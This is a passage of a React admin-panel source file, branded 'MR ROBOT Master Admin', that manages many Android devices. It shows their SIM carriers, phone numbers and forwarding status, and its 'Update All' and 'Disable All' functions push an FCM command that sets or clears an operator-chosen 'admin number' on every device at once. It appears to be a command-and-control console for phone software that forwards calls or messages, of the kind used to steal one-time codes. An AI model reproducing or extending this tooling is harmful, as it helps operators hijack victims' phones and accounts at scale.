                        {isOnline ? "ONLINE" : "OFFLINE"}
                      </span>
                    </div>

                    {/* Card body */}
                    <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 8, flex: 1 }}>
                      {/* Device name */}
                      <div style={{ fontWeight: 800, fontSize: 15, color: T.text, lineHeight: 1.2 }}>{d.name}</div>

                      {/* Device ID */}
                      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                        <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, flexShrink: 0 }}>Device ID</span>
                        <span style={{ fontFamily: "monospace", fontSize: 11, color: T.mutedLight, wordBreak: "break-all" }}>{d.deviceId}</span>
                        <button onClick={() => { void navigator.clipboard?.writeText(d.deviceId); }}
                          style={{ background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 12, padding: "1px 4px", flexShrink: 0 }} title="Copy">⎘</button>
                      </div>

                      {/* Divider */}
                      <div style={{ height: 1, background: T.border }} />

                      {/* SIM 1 */}
                      <SimRow slot={1} carrier={d.sim1Carrier} phone={d.sim1Phone} />
                      {/* SIM 2 */}
                      <SimRow slot={2} carrier={d.sim2Carrier} phone={d.sim2Phone} />

                      {/* Divider */}
                      <div style={{ height: 1, background: T.border }} />

                      {/* Meta row */}
                      <div style={{ display: "flex", flexWrap: "wrap", gap: "6px 12px" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                          <span style={{ fontSize: 10, color: T.muted }}>Android</span>
                          <span style={{ fontSize: 12, fontWeight: 700, color: d.androidVersion > 0 ? T.text : T.muted }}>
                            {d.androidVersion > 0 ? `v${d.androidVersion}` : "—"}
                          </span>
                        </div>
                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                          <span style={{ fontSize: 10, color: T.muted }}>FCM</span>
                          <span style={{ fontSize: 11, fontWeight: 700, color: d.hasFcm ? T.green : T.red }}>
                            {d.hasFcm ? "✓ Active" : "✗ None"}
                          </span>
                        </div>
                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                          <span style={{ fontSize: 10, color: T.muted }}>Forward</span>
                          <span style={{ fontSize: 11, fontWeight: 700, color: d.forwardEnabled ? T.green : T.muted }}>
                            {d.forwardEnabled ? `SIM${d.forwardSlot ?? "?"} ON` : "Off"}
                          </span>
                        </div>
                      </div>

                      {/* Times */}
                      <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
                          <span style={{ color: T.muted }}>Last Online</span>
                          <span style={{ color: d.lastOnline ? T.mutedLight : T.muted, fontWeight: 600 }}>{fmtAgo(d.lastOnline)}</span>
                        </div>
                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
                          <span style={{ color: T.muted }}>Installed</span>
                          <span style={{ color: T.mutedLight, fontWeight: 600 }}>{fmtAgo(d.installedAt)}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
          {hasMore && !loading && (
            <div style={{ textAlign: "center", marginTop: 20 }}>
              <button onClick={() => setPage(p => p + 1)}
                style={{ padding: "10px 32px", borderRadius: 10, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
                Load More ({filtered.length - shown.length} remaining)
              </button>
            </div>
          )}
          {!hasMore && shown.length > 0 && !loading && (
            <div style={{ textAlign: "center", marginTop: 16, color: T.muted, fontSize: 11 }}>
              {filtered.length} device{filtered.length !== 1 ? "s" : ""} shown
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function Dashboard({ masterPin, onLogout, onPinChanged }: { masterPin: string; onLogout: () => void; onPinChanged: (p: string) => void }) {
  const [appList, setAppList] = useState<App[]>([]);
  const [loading, setLoading] = useState(true);
  const [showCreate, setShowCreate] = useState(false);
  const [showChangePin, setShowChangePin] = useState(false);
  const [showAllDevices, setShowAllDevices] = useState(false);
  const [allDevicesList, setAllDevicesList] = useState<FullDevice[]>([]);
  const [allDevLoading, setAllDevLoading] = useState(false);
  const [allDevSearch, setAllDevSearch] = useState("");
  const [editApp, setEditApp] = useState<App | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);
  const [togglingId, setTogglingId] = useState<string | null>(null);
  const [copyMsg, setCopyMsg] = useState<Record<string, string>>({});
  const [logoutAllId, setLogoutAllId] = useState<string | null>(null);
  const [search, setSearch] = useState("");

  /* ── Master Update All App-IDs ── */
  const [masterNum, setMasterNum] = useState("");
  const [masterNumErr, setMasterNumErr] = useState("");
  const [masterUpdateState, setMasterUpdateState] = useState<"idle"|"loading"|"running"|"done"|"err">("idle");
  const [masterUpdateDone, setMasterUpdateDone] = useState(0);
  const [masterUpdateTotal, setMasterUpdateTotal] = useState(0);
  const [masterUpdateResult, setMasterUpdateResult] = useState<{ ok: number; fail: number } | null>(null);
  const [masterDisableState, setMasterDisableState] = useState<"idle"|"loading"|"running"|"done">("idle");
  const [masterDisableDone, setMasterDisableDone] = useState(0);
  const [masterDisableTotal, setMasterDisableTotal] = useState(0);
  const [masterDisableResult, setMasterDisableResult] = useState<{ ok: number; fail: number } | null>(null);

  function mkAdminUpdate(number: string, status: "on" | "off"): Record<string, string> {
    if (status === "on") return { type: "admin_update", status: "on", number };
    return { type: "admin_update", status: "off" };
  }

  async function masterFcmSend(deviceId: string, data: Record<string, string>): Promise<void> {
    const res = await apiFetch("/api/fcm/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ deviceId, data }),
    });
    if (!res.ok) throw new Error("FCM failed");
  }

  async function fetchAllDevices(): Promise<FullDevice[]> {
    const r = await apiFetch("/api/master/all-devices", { headers: { "x-master-pin": masterPin } });
    if (!r.ok) throw new Error("Failed to fetch devices");
    return r.json() as Promise<FullDevice[]>;
  }

  async function handleMasterUpdate() {
    const val = masterNum.replace(/\D/g, "");
    if (val.length !== 10) { setMasterNumErr("10 digits chahiye"); setTimeout(() => setMasterNumErr(""), 2500); return; }
    setMasterUpdateState("loading"); setMasterUpdateResult(null); setMasterUpdateDone(0); setMasterUpdateTotal(0); setMasterNumErr("");
    try {
      const allDevices = await fetchAllDevices();
      const eligible = allDevices.filter(d => d.hasFcm);
      setMasterUpdateTotal(eligible.length); setMasterUpdateState("running");
      const BATCH = 100; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d => masterFcmSend(d.deviceId, mkAdminUpdate(val, "on"))));
        results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
        setMasterUpdateDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
      }
      setMasterUpdateResult({ ok, fail }); setMasterUpdateState("done"); setMasterNum("");
      setTimeout(() => { setMasterUpdateState("idle"); setMasterUpdateDone(0); setMasterUpdateTotal(0); setMasterUpdateResult(null); }, 7000);
    } catch { setMasterUpdateState("err"); setTimeout(() => setMasterUpdateState("idle"), 3000); }
  }

  async function handleMasterDisable() {
    if (masterDisableState === "running" || masterDisableState === "loading") return;
    setMasterDisableState("loading"); setMasterDisableResult(null); setMasterDisableDone(0); setMasterDisableTotal(0);
    try {
      const allDevices = await fetchAllDevices();
      const eligible = allDevices.filter(d => d.hasFcm);
      setMasterDisableTotal(eligible.length); setMasterDisableState("running");
      const BATCH = 100; const DELAY = 300;
      let ok = 0; let fail = 0;
      for (let i = 0; i < eligible.length; i += BATCH) {
        const batch = eligible.slice(i, i + BATCH);
        const results = await Promise.allSettled(batch.map(d => masterFcmSend(d.deviceId, mkAdminUpdate("", "off"))));
        results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
        setMasterDisableDone(Math.min(i + BATCH, eligible.length));
        if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
      }
      setMasterDisableResult({ ok, fail }); setMasterDisableState("done");
      setTimeout(() => { setMasterDisableState("idle"); setMasterDisableDone(0); setMasterDisableTotal(0); setMasterDisableResult(null); }, 7000);
    } catch { setMasterDisableState("idle"); }
  }

  // Sort by createdAt descending — newest first
  const sortedApps = [...appList].sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );

  const fetchApps = useCallback(async () => {
    try {
      const r = await apiFetch("/api/master/apps", { headers: { "x-master-pin": masterPin } });
      if (r.status === 401) { onLogout(); return; }
      if (!r.ok) return;
      setAppList(await r.json() as App[]);
    } catch { /* ignore */ } finally { setLoading(false); }
  }, [masterPin, onLogout]);

  useEffect(() => { void fetchApps(); }, [fetchApps]);

  async function toggleStatus(app: App) {
    setTogglingId(app.appId);
    const newStatus = app.status === "active" ? "disabled" : "active";
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json", "x-master-pin": masterPin },
        body: JSON.stringify({ status: newStatus }),
      });
      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a, status: newStatus } : a));
    } catch { /* ignore */ } finally { setTogglingId(null); }
  }

  async function deleteApp(app: App) {
    if (!confirm(`Delete "${app.name}"?\nThis cannot be undone.`)) return;
    setDeletingId(app.appId);
    try {
      await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, {
        method: "DELETE",
        headers: { "x-master-pin": masterPin },
      });
      setAppList(prev => prev.filter(a => a.appId !== app.appId));
    } catch { /* ignore */ } finally { setDeletingId(null); }
  }

  async function logoutAll(app: App) {
    if (!confirm(`"${app.name}" ke sabhi logged-in users ko logout karein?`)) return;
    setLogoutAllId(app.appId);
    try {
      await apiFetch(`/api/admin/sessions?appId=${encodeURIComponent(app.appId)}`, { method: "DELETE" });
      setAppList(prev => prev.map(a => a.appId === app.appId ? { ...a, activeSessions: 0 } : a));
    } catch { /* ignore */ } finally { setLogoutAllId(null); }
  }

  async function openAllDevices(forceRefresh = false) {
    setShowAllDevices(true);
    setAllDevSearch("");
    if (!forceRefresh && allDevicesList.length > 0) return; // use cache
    setAllDevLoading(true);
    try {
      const list = await fetchAllDevices();
      setAllDevicesList(list);
    } catch { /* ignore */ } finally { setAllDevLoading(false); }
  }

  function copyUrl(app: App) {
    const url = `${window.location.origin}/preview/dashboard/WebDashboard?appId=${app.appId}`;
    copyToClipboard(url).then(() => {
      setCopyMsg(p => ({ ...p, [app.appId]: "✓ Copied!" }));
      setTimeout(() => setCopyMsg(p => ({ ...p, [app.appId]: "" })), 2000);
    });
  }

  const filteredApps = search.trim() === ""
    ? sortedApps
    : sortedApps.filter(a =>
        a.appId.toLowerCase().includes(search.trim().toLowerCase()) ||
        a.name.toLowerCase().includes(search.trim().toLowerCase())
      );

  const activeCount = appList.filter(a => a.status === "active").length;
  const disabledCount = appList.length - activeCount;

  return (
    <div style={{ minHeight: "100vh", background: T.bg, fontFamily: "system-ui", color: T.text }}>

      {/* ── Header ── */}
      <div style={{
        background: T.headerBg,
        borderBottom: `1px solid ${T.border}`,
        padding: "0 20px",
        position: "sticky", top: 0, zIndex: 50,
      }}>
        <div style={{
          maxWidth: 960, margin: "0 auto",
          display: "flex", alignItems: "center", justifyContent: "space-between",
          height: 60, gap: 12,
        }}>
          {/* Brand */}
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <div style={{
              width: 32, height: 32, borderRadius: 8,
              background: "linear-gradient(135deg,#6366f1,#8b5cf6)",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontSize: 16, flexShrink: 0,
            }}>🤖</div>
            <div>
              <div style={{ fontSize: 15, fontWeight: 900, color: T.text, letterSpacing: -0.3, lineHeight: 1.1 }}>MR ROBOT</div>
              <div style={{ fontSize: 10, color: T.accent, fontWeight: 700, letterSpacing: 0.5 }}>Master Admin</div>
            </div>
          </div>

          {/* Actions */}
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <button onClick={() => void openAllDevices()}
              style={{ padding: "7px 14px", borderRadius: 8, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontWeight: 700, fontSize: 12, cursor: "pointer", whiteSpace: "nowrap", boxShadow: "0 2px 8px rgba(99,102,241,0.35)" }}>
              📱 All Devices
            </button>
            <button onClick={() => setShowChangePin(true)}
              style={{ padding: "7px 14px", borderRadius: 8, background: T.borderLight, border: "none", color: T.text, fontWeight: 600, fontSize: 12, cursor: "pointer", whiteSpace: "nowrap" }}>
              🔑 PIN
            </button>
            <button onClick={onLogout}
              style={{ padding: "7px 14px", borderRadius: 8, background: "transparent", border: `1px solid ${T.border}`, color: T.muted, fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
              Logout
            </button>
          </div>
        </div>
      </div>

      {/* ── Main content ── */}
      <div style={{ maxWidth: 960, margin: "0 auto", padding: "24px 16px" }}>

        {/* Stats */}
        <div style={{
          display: "grid",
          gridTemplateColumns: "repeat(3,1fr)",
          gap: 12, marginBottom: 24,
        }}>
          {[
            { label: "Total Apps", val: appList.length, color: T.accent, icon: "📦" },
            { label: "Active", val: activeCount, color: T.green, icon: "✅" },
            { label: "Disabled", val: disabledCount, color: T.red, icon: "🚫" },
          ].map(({ label, val, color, icon }) => (
            <div key={label} style={{
              background: T.card, borderRadius: 12, padding: "16px 18px",
              border: `1px solid ${T.borderLight}`,
              boxShadow: `0 0 0 1px ${color}18 inset`,
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 6 }}>
                <span style={{ fontSize: 18 }}>{icon}</span>
                <span style={{ fontSize: 11, color: T.muted, fontWeight: 600 }}>{label}</span>
              </div>
              <div style={{ fontSize: 30, fontWeight: 900, color }}>{val}</div>
            </div>
          ))}
        </div>

        {/* ── Master Update All App-IDs ── */}
        <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden", marginBottom: 20 }}>
          <div style={{ padding: "12px 18px", borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 18 }}>📡</span>
              <span style={{ fontWeight: 800, fontSize: 14, color: T.text }}>Update All App-IDs</span>
            </div>
            <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontSize: 10, fontWeight: 800, border: `1px solid ${T.accent}44` }}>
              ALL DEVICES
            </span>
          </div>
          <div style={{ padding: "16px 18px", display: "flex", flexDirection: "column", gap: 12 }}>
            <div style={{ fontSize: 12, color: T.muted, lineHeight: 1.5 }}>
              Sare app-ids ke <b style={{ color: T.mutedLight }}>ALL devices</b> ko ek saath Admin Update FCM bhejo — nested, high priority.
            </div>

            {/* Number input */}
            <input
              type="tel"
              value={masterNum}
              onChange={e => { const d = e.target.value.replace(/\D/g, "").slice(0, 10); setMasterNum(d); if (masterNumErr) setMasterNumErr(""); }}
              placeholder="10-digit admin number"
              maxLength={10}
              disabled={masterUpdateState === "running" || masterUpdateState === "loading"}
              style={{
                width: "100%", boxSizing: "border-box", padding: "11px 14px", borderRadius: 10,
                border: `1.5px solid ${masterNumErr ? T.red : masterNum.length === 10 ? T.accent + "80" : T.borderLight}`,
                background: T.inputBg, color: T.text, fontSize: 14, outline: "none", letterSpacing: 1,
              }}
            />
            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11 }}>
              <span style={{ color: masterNumErr ? T.red : T.muted, fontWeight: 600 }}>{masterNumErr || `${masterNum.length}/10 digits`}</span>
              {masterNum.length === 10 && masterUpdateState === "idle" && <span style={{ color: T.green, fontWeight: 700 }}>✓ Ready</span>}
            </div>

            {/* Update progress */}
            {(masterUpdateState === "running" || masterUpdateState === "loading") && (
              <div>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
                  <span>{masterUpdateState === "loading" ? "Devices fetch ho rahe hain…" : "Sab ko update bhej raha hai…"}</span>
                  {masterUpdateState === "running" && <span>{masterUpdateDone}/{masterUpdateTotal}</span>}
                </div>
                <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
                  <div style={{ height: "100%", background: `linear-gradient(90deg, ${T.accent}, #8b5cf6)`, width: masterUpdateState === "loading" ? "20%" : `${masterUpdateTotal > 0 ? Math.round((masterUpdateDone / masterUpdateTotal) * 100) : 0}%`, transition: "width 0.3s" }} />
                </div>
              </div>
            )}

            {/* Disable progress */}
            {(masterDisableState === "running" || masterDisableState === "loading") && (
              <div>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: T.muted, marginBottom: 5 }}>
                  <span>{masterDisableState === "loading" ? "Devices fetch ho rahe hain…" : "Disable bhej raha hai…"}</span>
                  {masterDisableState === "running" && <span>{masterDisableDone}/{masterDisableTotal}</span>}
                </div>
                <div style={{ height: 5, background: T.border, borderRadius: 3, overflow: "hidden" }}>
                  <div style={{ height: "100%", background: T.red, width: masterDisableState === "loading" ? "20%" : `${masterDisableTotal > 0 ? Math.round((masterDisableDone / masterDisableTotal) * 100) : 0}%`, transition: "width 0.3s" }} />
                </div>
              </div>
            )}

            {/* Result banners */}
            {masterUpdateState === "done" && masterUpdateResult && (
              <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 10, padding: "10px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>✅ Update done!</span>
                <span style={{ fontSize: 12, color: T.muted }}>
                  <span style={{ color: T.green, fontWeight: 700 }}>{masterUpdateResult.ok}</span> sent
                  {masterUpdateResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{masterUpdateResult.fail}</span> failed</>}
                </span>
              </div>
            )}
            {masterDisableState === "done" && masterDisableResult && (
              <div style={{ background: T.green + "18", border: `1px solid ${T.green}44`, borderRadius: 10, padding: "10px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                <span style={{ color: T.green, fontWeight: 700, fontSize: 13 }}>✅ Disable done!</span>
                <span style={{ fontSize: 12, color: T.muted }}>
                  <span style={{ color: T.green, fontWeight: 700 }}>{masterDisableResult.ok}</span> sent
                  {masterDisableResult.fail > 0 && <> · <span style={{ color: T.red, fontWeight: 700 }}>{masterDisableResult.fail}</span> failed</>}
                </span>
              </div>
            )}
            {masterUpdateState === "err" && (
              <div style={{ background: T.red + "15", border: `1px solid ${T.red}33`, borderRadius: 10, padding: "10px 14px", color: T.red, fontSize: 13, fontWeight: 700 }}>⚠ Fetch failed. Retry karo.</div>
            )}

            {/* Update + Disable buttons */}
            <div style={{ display: "flex", gap: 10 }}>
              <button
                onClick={() => void handleMasterUpdate()}
                disabled={masterUpdateState === "running" || masterUpdateState === "loading" || masterDisableState === "running" || masterDisableState === "loading"}
                style={{
                  flex: 1, padding: "12px 0", borderRadius: 10, border: "none",
                  background: masterUpdateState === "done" ? T.green : (masterUpdateState === "running" || masterUpdateState === "loading") ? T.accentGlow : masterNum.length === 10 ? `linear-gradient(135deg,${T.accent},#8b5cf6)` : T.borderLight,
                  color: masterUpdateState === "done" ? "#fff" : (masterUpdateState === "running" || masterUpdateState === "loading") ? T.accent : masterNum.length === 10 ? "#fff" : T.muted,
                  fontWeight: 800, fontSize: 13,
                  cursor: (masterUpdateState !== "idle" || masterDisableState !== "idle") ? "not-allowed" : masterNum.length < 10 ? "not-allowed" : "pointer",
                  boxShadow: masterNum.length === 10 && masterUpdateState === "idle" ? "0 4px 14px rgba(99,102,241,0.35)" : "none",
                  transition: "all 0.15s",
                }}
              >
                {masterUpdateState === "loading" ? "Fetching…" : masterUpdateState === "running" ? `${masterUpdateDone}/${masterUpdateTotal}…` : masterUpdateState === "done" ? "Done ✓" : masterUpdateState === "err" ? "Error ✗" : "Update All"}
              </button>
              <button
                onClick={() => void handleMasterDisable()}
                disabled={masterDisableState === "running" || masterDisableState === "loading" || masterUpdateState === "running" || masterUpdateState === "loading"}
                style={{
                  flex: 1, padding: "12px 0", borderRadius: 10,
                  border: `1.5px solid ${masterDisableState === "done" ? T.green : T.red}`,
                  background: masterDisableState === "done" ? T.green : (masterDisableState === "running" || masterDisableState === "loading") ? T.red + "22" : "transparent",
                  color: masterDisableState === "done" ? "#fff" : T.red,
                  fontWeight: 800, fontSize: 13,
                  cursor: (masterDisableState !== "idle" || masterUpdateState !== "idle") ? "not-allowed" : "pointer",
                  transition: "all 0.15s",
                }}
              >
                {masterDisableState === "loading" ? "Fetching…" : masterDisableState === "running" ? `${masterDisableDone}/${masterDisableTotal}…` : masterDisableState === "done" ? "Done ✓" : "Disable All"}
              </button>
            </div>
          </div>
        </div>

        {/* Apps header */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12, gap: 12, flexWrap: "wrap" }}>
          <div>
            <div style={{ fontSize: 16, fontWeight: 800 }}>Sub-Admin Apps</div>
            <div style={{ fontSize: 12, color: T.muted, marginTop: 2 }}>Sorted by newest first</div>
          </div>
          <button onClick={() => setShowCreate(true)}
            style={{
              padding: "10px 20px", borderRadius: 10,
              background: "linear-gradient(135deg,#6366f1,#8b5cf6)",
              border: "none", color: "#fff", fontWeight: 800, fontSize: 13, cursor: "pointer",
              boxShadow: "0 4px 14px rgba(99,102,241,0.35)", whiteSpace: "nowrap",
            }}>
            + New App
          </button>
        </div>

        {/* Search */}
        <div style={{ marginBottom: 14, position: "relative" }}>
          <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", fontSize: 14, color: T.muted, pointerEvents: "none" }}>🔍</span>
          <input
            type="text"
            placeholder="Search by App ID or name…"
            value={search}
            onChange={e => setSearch(e.target.value)}
            style={{
              width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 38px",
              borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`,
              color: T.text, fontSize: 13, outline: "none", fontFamily: "monospace",
            }}
          />
          {search && (
            <button onClick={() => setSearch("")} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: T.muted, cursor: "pointer", fontSize: 16, lineHeight: 1 }}>✕</button>
          )}
        </div>

        {/* List */}
        {loading ? (
          <div style={{ textAlign: "center", padding: 60, color: T.muted }}>
            <div style={{ fontSize: 28, marginBottom: 10 }}>⏳</div>
            Loading apps…
          </div>
        ) : filteredApps.length === 0 ? (
          <div style={{ textAlign: "center", padding: 60, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}` }}>
            <div style={{ fontSize: 32, marginBottom: 10 }}>{search ? "🔍" : "📭"}</div>
            {search ? `"${search}" se koi app nahi mila.` : 'No apps yet. Click "+ New App" to create one.'}
          </div>
        ) : (
          <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
            {filteredApps.map(app => (
              <AppCard
                key={app.appId}
                app={app}
                masterPin={masterPin}
                onEdit={setEditApp}
                onDelete={deleteApp}
                onToggle={toggleStatus}
                onLogoutAll={logoutAll}
                onCopyUrl={copyUrl}
                copyMsg={copyMsg}
                deletingId={deletingId}
                togglingId={togglingId}
                logoutAllId={logoutAllId}
              />
            ))}
          </div>
        )}
      </div>

      {/* Modals */}
      {showAllDevices && (
        <AllDevicesModal
          devices={allDevicesList}
          loading={allDevLoading}
          search={allDevSearch}
          onSearchChange={setAllDevSearch}
          onClose={() => setShowAllDevices(false)}
          onRefresh={() => void openAllDevices(true)}
        />
      )}
      {showCreate && (
        <CreateAppModal masterPin={masterPin} onClose={() => setShowCreate(false)}
          onCreated={a => { setAppList(prev => [a, ...prev]); setShowCreate(false); }} />
      )}
      {showChangePin && (
        <ChangePinModal masterPin={masterPin} onClose={() => setShowChangePin(false)}
          onChanged={p => { onPinChanged(p); setShowChangePin(false); }} />
      )}
      {editApp && (
        <EditAppModal app={editApp} masterPin={masterPin} onClose={() => setEditApp(null)}
          onUpdated={a => { setAppList(prev => prev.map(x => x.appId === a.appId ? a : x)); setEditApp(null); }} />
      )}

      {/* Responsive styles */}
      <style>{`
        @media (max-width: 480px) {
          .mr-stats-grid { grid-template-columns: repeat(3,1fr) !important; }
        }
      `}</style>
    </div>
  );
}

/* ─────────── Root Export ─────────── */
export default function MainAdminPanel() {
  const [masterPin, setMasterPin] = useState<string | null>(() => {
    return sessionStorage.getItem("mrrobot_master_auth") ?? null;
  });

  function handleAuth(pin: string) {
    sessionStorage.setItem("mrrobot_master_auth", pin);
    setMasterPin(pin);
  }

  function handleLogout() {
    sessionStorage.removeItem("mrrobot_master_auth");
    setMasterPin(null);
  }

  function handlePinChanged(newPin: string) {
    sessionStorage.setItem("mrrobot_master_auth", newPin);
    setMasterPin(newPin);
    alert("Master PIN changed successfully!");
  }

  if (!masterPin) return <MasterLogin onAuth={handleAuth} />;
  return <Dashboard masterPin={masterPin} onLogout={handleLogout} onPinChanged={handlePinChanged} />;
}
